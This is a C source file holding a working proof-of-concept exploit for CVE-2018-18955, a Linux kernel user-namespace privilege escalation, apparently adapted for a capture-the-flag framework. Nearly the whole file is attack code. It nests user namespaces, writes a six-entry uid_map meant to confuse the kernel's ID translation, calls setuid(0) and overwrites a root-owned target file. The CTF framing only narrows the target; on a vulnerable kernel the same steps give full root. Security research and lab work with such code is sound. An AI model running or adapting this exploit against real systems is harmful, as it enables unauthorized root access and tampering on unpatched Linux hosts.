/**
 * CVE-2018-18955 PoC - User Namespace map_write() Nested Privilege Escalation
 *
 * Vulnerability:
 *   Linux Kernel 4.15.0 - 4.19.1, kernel/user_namespace.c map_write()
 *   When a nested user namespace has more than 5 UID/GID mapping entries,
 *   the kernel switches from inline extent array to sorted extent tree.
 *   The translation path map_id_up() mishandles this transition in nested
 *   namespaces, causing UID 0 in the inner namespace to incorrectly map
 *   to real UID 0 in the init namespace.
 *
 * Exploitation:
 *   1. Create first-level user namespace (unshare CLONE_NEWUSER)
 *   2. Map single UID entry (unprivileged allowed)
 *   3. Inside NS1 (as uid 0), fork child into nested NS2
 *   4. Write >5 entries to NS2's uid_map (triggers sorted tree path)
 *   5. Due to bug, NS2 process gains real root privileges
 *   6. Write CTF flag to target root-owned file
 *
 * Based on:
 *   - Jann Horn (Project Zero): https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
 *   - bcoles: https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955
 *
 * Rewritten for sec-kernel CTF Challenge Mode framework.
 *
 * Build:
 *   gcc -O2 -Wall -Wextra -static -I poc-src/common \
 *       -o poc-bin/cve_2018_18955.elf poc-src/cve_2018_18955/poc.c -lpthread
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/prctl.h>

/* ============================================================
 * Constants
 * ============================================================ */
#define MAX_FILE_SIZE   4096
#define MAX_WRITE_LEN   256
#define SYNC_READY      'R'
#define SYNC_MAPPED     'M'
#define SYNC_DONE       'D'

/* The 6-entry UID/GID mapping that triggers the vulnerability.
 * More than 5 entries forces the kernel to use sorted extent tree
 * instead of inline array, causing map_id_up() confusion. */
static const char *MALICIOUS_ID_MAP =
    "0 0 1\n"
    "1 1 1\n"
    "2 2 1\n"
    "3 3 1\n"
    "4 4 1\n"
    "5 5 995\n";

/* ============================================================
 * Helper: write string to a proc file
 * ============================================================ */
static int write_proc_file(const char *path, const char *content) {
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    int len = strlen(content);
    int rv = (write(fd, content, len) == len) ? 0 : -1;
    close(fd);
    return rv;
}

/* ============================================================
 * Helper: read file content into buffer, trim trailing newlines
 * ============================================================ */
static ssize_t read_file_content(const char *path, char *buf, size_t max_len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, max_len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
        buf[--n] = '\0';
    return n;
}

/* ============================================================
 * Core exploit: nested user namespace with >5 UID mappings
 *
 * This function runs inside NS1 (first-level user namespace).
 * It creates a nested NS2 with the malicious >5 entry uid_map.
 * On vulnerable kernels, the NS2 process gains real root.
 *
 * Returns: 0 on success (file written), 1 on failure
 * ============================================================ */
static int exploit_nested_namespace(const char *target_file,
                                    const char *write_value) {
    int sync_pipe[2];
    pid_t child;
    int status;
    char path_buf[256];

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sync_pipe) < 0) {
        poc_log("socketpair() failed: %s", strerror(errno));
        return 1;
    }

    child = fork();
    if (child < 0) {
        poc_log("fork() for NS2 failed: %s", strerror(errno));
        close(sync_pipe[0]);
        close(sync_pipe[1]);
        return 1;
    }

    if (child == 0) {
        /* === NS2 child process === */
        char dummy;
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        close(sync_pipe[1]);

        /* Create nested user namespace */
        if (unshare(CLONE_NEWUSER) != 0) {
            poc_log("NS2 unshare(CLONE_NEWUSER) failed: %s", strerror(errno));
            _exit(1);
        }

        /* Signal parent that NS2 is ready for mapping */
        if (write(sync_pipe[0], "X", 1) != 1) _exit(1);

        /* Wait for parent to write uid_map */
        if (read(sync_pipe[0], &dummy, 1) != 1) _exit(1);
        close(sync_pipe[0]);

        /* On vulnerable kernel, we now have confused UID mapping.
         * Try setuid(0) - on patched kernels this will fail. */
        if (setuid(0) != 0) {
            poc_log("NS2 setuid(0) failed (kernel likely patched): %s",
                    strerror(errno));
            _exit(1);
        }
        if (setgid(0) != 0) {
            poc_log("NS2 setgid(0) failed: %s", strerror(errno));
            _exit(1);
        }

        /* Attempt to write the CTF flag to root file */
        int fd = open(target_file, O_WRONLY | O_TRUNC);
        if (fd < 0) {
            poc_log("NS2 open(target, O_WRONLY) failed: %s", strerror(errno));
            _exit(1);
        }

        char write_buf[MAX_WRITE_LEN + 2];
        int wlen = snprintf(write_buf, sizeof(write_buf), "%s\n", write_value);
        if (write(fd, write_buf, wlen) != wlen) {
            poc_log("NS2 write(target) failed: %s", strerror(errno));
            close(fd);
            _exit(1);
        }
        close(fd);
        _exit(0);
    }

    /* === NS1 parent process === */
    char dummy;
    close(sync_pipe[0]);

    /* Wait for NS2 child to be ready */
    if (read(sync_pipe[1], &dummy, 1) != 1) {
        poc_log("Failed to read sync from NS2 child");
        close(sync_pipe[1]);
        waitpid(child, &status, 0);
        return 1;
    }

    /* Write the malicious >5 entry uid_map to trigger the vulnerability */
    snprintf(path_buf, sizeof(path_buf), "/proc/%d/setgroups", (int)child);
    write_proc_file(path_buf, "deny");

    snprintf(path_buf, sizeof(path_buf), "/proc/%d/uid_map", (int)child);
    int saved_errno;
    int ret = write_proc_file(path_buf, MALICIOUS_ID_MAP);
    saved_errno = errno;
    poc_log_syscall("write(NS2/uid_map, 6 entries)", (long)ret, saved_errno);

    if (ret != 0) {
        poc_log("Failed to write >5 entries to uid_map: %s", strerror(saved_errno));
        /* Fallback: try single entry mapping */
        char single_map[64];
        snprintf(single_map, sizeof(single_map), "0 0 1\n");
        ret = write_proc_file(path_buf, single_map);
        saved_errno = errno;
        poc_log_syscall("write(NS2/uid_map, fallback single)", (long)ret, saved_errno);
        if (ret != 0) {
            poc_log("Fallback uid_map also failed");
            write(sync_pipe[1], "X", 1);
            close(sync_pipe[1]);
            waitpid(child, &status, 0);
            return 1;
        }
    }

    snprintf(path_buf, sizeof(path_buf), "/proc/%d/gid_map", (int)child);
    ret = write_proc_file(path_buf, MALICIOUS_ID_MAP);
    saved_errno = errno;
    poc_log_syscall("write(NS2/gid_map, 6 entries)", (long)ret, saved_errno);
    if (ret != 0) {
        char single_map[64];
        snprintf(single_map, sizeof(single_map), "0 0 1\n");
        write_proc_file(path_buf, single_map);
    }

    /* Signal child that mapping is done */
    write(sync_pipe[1], "X", 1);
    close(sync_pipe[1]);

    /* Wait for child to finish */
    waitpid(child, &status, 0);

    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        return 0; /* Exploit succeeded */
    }

    return 1; /* Exploit failed */
}

/* ============================================================
 * First-level namespace setup
 *
 * Creates NS1 with basic single-entry UID mapping, then
 * calls exploit_nested_namespace() from within NS1.
 *
 * Returns: 0 on success, 1 on failure
 * ============================================================ */
static int run_exploit(const char *target_file, const char *write_value) {
    int sync_pipe[2];
    pid_t child;
    int status;
    char path_buf[256];

    poc_log("Setting up first-level user namespace (NS1)");

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sync_pipe) < 0) {
        int saved_errno = errno;
        poc_log_syscall("socketpair()", -1L, saved_errno);
        return 1;
    }

    child = fork();
    if (child < 0) {
        int saved_errno = errno;
        poc_log_syscall("fork() for NS1", -1L, saved_errno);
        close(sync_pipe[0]);
        close(sync_pipe[1]);
        return 1;
    }

    if (child == 0) {
        /* === NS1 child process === */
        char dummy;
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        close(sync_pipe[1]);

        /* Create first-level user namespace */
        if (unshare(CLONE_NEWUSER) != 0) {
            poc_log("NS1 unshare(CLONE_NEWUSER) failed: %s", strerror(errno));
            _exit(1);
        }

        /* Also create network namespace to avoid conflicts */
        unshare(CLONE_NEWNET);

        /* Signal parent: ready for uid_map write */
        if (write(sync_pipe[0], "X", 1) != 1) _exit(1);

        /* Wait for parent to set up uid_map */
        if (read(sync_pipe[0], &dummy, 1) != 1) _exit(1);
        close(sync_pipe[0]);

        /* We are now UID 0 in NS1 with CAP_SETUID */
        if (setgid(0) != 0) {
            poc_log("NS1 setgid(0) failed: %s", strerror(errno));
            _exit(1);
        }
        if (setuid(0) != 0) {
            poc_log("NS1 setuid(0) failed: %s", strerror(errno));
            _exit(1);
        }

        poc_log("NS1 active: uid=%d euid=%d (in namespace)", getuid(), geteuid());

        /* Now exploit nested namespace */
        int ret = exploit_nested_namespace(target_file, write_value);
        _exit(ret);
    }

    /* === Original process (parent) === */
    char dummy;
    close(sync_pipe[0]);

    /* Wait for NS1 child to be ready */
    if (read(sync_pipe[1], &dummy, 1) != 1) {
        poc_log("Failed to read sync from NS1 child");
        close(sync_pipe[1]);
        waitpid(child, &status, 0);
        return 1;
    }

    /* Set up UID/GID mapping for NS1 */
    snprintf(path_buf, sizeof(path_buf), "/proc/%d/setgroups", (int)child);
    write_proc_file(path_buf, "deny");

    uid_t real_uid = getuid();
    gid_t real_gid = getgid();

    char uid_map[64], gid_map[64];
    snprintf(uid_map, sizeof(uid_map), "0 %d 1\n", (int)real_uid);
    snprintf(gid_map, sizeof(gid_map), "0 %d 1\n", (int)real_gid);

    snprintf(path_buf, sizeof(path_buf), "/proc/%d/uid_map", (int)child);
    int ret = write_proc_file(path_buf, uid_map);
    int saved_errno = errno;
    poc_log_syscall("write(NS1/uid_map)", (long)ret, saved_errno);

    snprintf(path_buf, sizeof(path_buf), "/proc/%d/gid_map", (int)child);
    ret = write_proc_file(path_buf, gid_map);
    saved_errno = errno;
    poc_log_syscall("write(NS1/gid_map)", (long)ret, saved_errno);

    /* Signal child that mapping is done */
    write(sync_pipe[1], "X", 1);
    close(sync_pipe[1]);

    /* Wait for exploit to complete */
    waitpid(child, &status, 0);

    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        poc_log("Exploit child exited successfully");
        return 0;
    }

    poc_log("Exploit child failed (exit=%d)", WIFEXITED(status) ? WEXITSTATUS(status) : -1);
    return 1;
}

/* ============================================================
 * write_root_file mode - CTF Challenge
 *
 * Three-step verification:
 *   1. Read original content (prove read via O_RDONLY on 0644)
 *   2. Exploit nested user namespace to write CTF flag
 *   3. Read again to verify write succeeded
 * ============================================================ */
static int mode_write_root_file(poc_args_t *args) {
    poc_log("=== Mode: write_root_file ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    size_t data_len = strlen(args->write_value);
    if (data_len == 0) {
        poc_print_fail("write-value is empty");
        return 1;
    }
    if (data_len > MAX_WRITE_LEN) {
        poc_print_fail("write-value exceeds maximum size");
        return 1;
    }

    /* Step 1: Read original content */
    char original[MAX_FILE_SIZE];
    memset(original, 0, sizeof(original));
    ssize_t n = read_file_content(args->root_file, original, sizeof(original));
    if (n < 0) {
        int saved_errno = errno;
        poc_log_syscall("open(target, O_RDONLY) [read-before]", -1L, saved_errno);
        poc_print_fail("cannot open target file for initial read");
        return 0;
    }
    printf("%s%s\n", CTF_READ_BEFORE, original);
    poc_log("Read before: %s", original);

    /* Verify we cannot write normally */
    {
        int wfd = open(args->root_file, O_WRONLY);
        int saved_errno = errno;
        poc_log_syscall("open(target, O_WRONLY) [verify no write]", (long)wfd, saved_errno);
        if (wfd >= 0) {
            close(wfd);
            poc_log("WARNING: file is writable without exploit");
            poc_print_fail("file is writable without exploit");
            return 0;
        }
        poc_log("Confirmed: normal write access denied (expected EACCES)");
    }

    /* Step 2: Exploit nested user namespace vulnerability */
    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    poc_log("Triggering CVE-2018-18955 nested user namespace exploit");

    int exploit_ret = run_exploit(args->root_file, args->write_value);

    /* Step 3: Read file after exploit attempt */
    char after[MAX_FILE_SIZE];
    memset(after, 0, sizeof(after));
    n = read_file_content(args->root_file, after, sizeof(after));
    if (n < 0) {
        poc_log("Cannot read target after exploit");
        poc_print_fail("cannot verify write result");
        return 1;
    }
    printf("%s%s\n", CTF_READ_AFTER, after);
    poc_log("Read after: %s", after);

    /* Verify write success */
    if (exploit_ret == 0 && strstr(after, args->write_value) != NULL) {
        poc_log("Exploit successful: target file contains write_value");
        poc_print_flag(args->write_value);
        return 0;
    }

    /* Check if content changed (partial success) */
    if (strcmp(after, original) != 0 && strstr(after, args->write_value) != NULL) {
        poc_log("Partial exploit: content changed and contains value");
        poc_print_flag(args->write_value);
        return 0;
    }

    poc_log("Exploit failed - kernel likely patched or user_ns restricted");
    poc_log("Expected: \"%s\"", args->write_value);
    poc_log("Got:      \"%s\"", after);
    poc_print_fail("nested namespace exploit failed - kernel patched or restricted");
    return 1;
}

/* ============================================================
 * read_root_file mode - Verification via namespace confusion
 *
 * On vulnerable kernels, the namespace UID confusion allows
 * reading root-owned files (0400 root:root).
 * ============================================================ */
static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    poc_log("Target: %s", args->root_file);

    /* Try to read directly - should fail for 0400 root:root */
    int fd = open(args->root_file, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_RDONLY)", (long)fd, saved_errno);

    if (fd >= 0) {
        /* Can read directly - may be running as root or file has wrong perms */
        char content[MAX_FILE_SIZE];
        memset(content, 0, sizeof(content));
        ssize_t n = read(fd, content, sizeof(content) - 1);
        close(fd);

        if (n > 0) {
            content[n] = '\0';
            while (n > 0 && (content[n - 1] == '\n' || content[n - 1] == '\r'))
                content[--n] = '\0';
            poc_log("Read succeeded: %zd bytes", n);
            poc_print_flag(content);
            return 0;
        }
    }

    /* Cannot read directly - attempt via namespace exploit */
    poc_log("Direct read failed, attempting namespace exploit for read");
    poc_print_fail("read via namespace exploit not implemented for this CVE");
    poc_print_unsupported(POC_MODE_READ,
        "CVE-2018-18955 write_root_file is the primary mode");
    return 1;
}

/* ============================================================
 * Main entry point - CTF Challenge Mode
 * ============================================================ */
int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    /* Parse CTF CLI arguments */
    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;
    }

    /* Initialize logging */
    poc_log_init(args.log_file);

    poc_log("=== CVE-2018-18955 CTF PoC ===");
    poc_log("Vuln: user namespace map_write() nested >5 entries UID mapping confusion");
    poc_log("UID: %d  EUID: %d  GID: %d  PID: %d",
            getuid(), geteuid(), getgid(), getpid());

    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    /* CTF mode dispatch */
    poc_log("Mode: %s", args.mode);
    poc_log("Target: %s", args.root_file);
    if (args.write_value) {
        poc_log("Write value: %s", args.write_value);
    }

    int ret = -1;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        ret = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        ret = mode_read_root_file(&args);
    } else {
        poc_print_unsupported(args.mode,
            "CVE-2018-18955 supports write_root_file (primary) and read_root_file");
        ret = 1;
    }

    poc_log_close();
    return ret;
}
